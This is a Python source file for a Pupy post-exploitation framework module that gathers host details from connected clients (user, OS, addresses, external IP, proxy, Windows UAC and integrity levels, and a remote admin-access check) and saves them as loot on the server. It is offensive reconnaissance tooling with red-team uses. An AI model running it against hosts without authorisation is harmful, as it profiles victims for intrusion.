# -*- coding: utf-8 -*-


import sys

from pupy.pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from pupy.pupylib.PupyOutput import Table

__class_name__="GetInfo"

@config(cat="gather")
class GetInfo(PupyModule):
    """ get some informations about one or multiple clients """
    dependencies = {
        'windows': ['pupwinutils.security'],
    }

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(
            prog='get_info',
            description=cls.__doc__
        )

    def run(self, args):
        commonKeys = [
            "hostname", "user", "release", "version", "cmdline",
            "os_arch", "proc_arch", "pid", "exec_path", "cid",
            "address", "macaddr", "spi", "revision", "node",
            "debug_logfile", "native", "proxy", "external_ip"
        ]
        pupyKeys = ["launcher", "launcher_args"]
        windKeys = ["uac_lvl","intgty_lvl"]
        linuxKeys = []
        macKeys = []

        infos = []

        for k in commonKeys:
            if k in self.client.desc:
                infos.append((k, self.client.desc[k]))

        if self.client.is_windows():
            for k in windKeys:
                infos.append((k, self.client.desc[k]))

            can_get_admin_access = self.client.remote(
                'pupwinutils.security', 'can_get_admin_access', False)

            currentUserIsLocalAdmin = can_get_admin_access()

            value = '?'
            if currentUserIsLocalAdmin:
                value = 'Yes'
            elif not currentUserIsLocalAdmin:
                value = 'No'

            infos.append(('local_adm', value))

        for k in pupyKeys:
            if k in self.client.desc:
                infos.append((k, self.client.desc[k]))

        infos.append(('platform', '{}/{}'.format(
            self.client.platform, self.client.arch or '?'
        )))

        #For remplacing None or "" value by "?"
        infoTemp = []
        for i, (key, value) in enumerate(infos):
            if value is None or value == "":
                value = "?"
            elif type(value) in (list, tuple):
                value = ' '.join([str(x) for x in value])
            elif key == 'cid':
                value = '{:016x}'.format(value)
            infoTemp.append((key, value))

        infos = infoTemp

        table = [{
            'KEY': k,
            'VALUE': v
        } for k,v in infoTemp]

        self.log(Table(table, ['KEY', 'VALUE'], legend=False))

        # Lưu loot tập trung để query sau từ server
        try:
            self.store_loot('get_info', dict(infoTemp))
        except Exception:
            pass
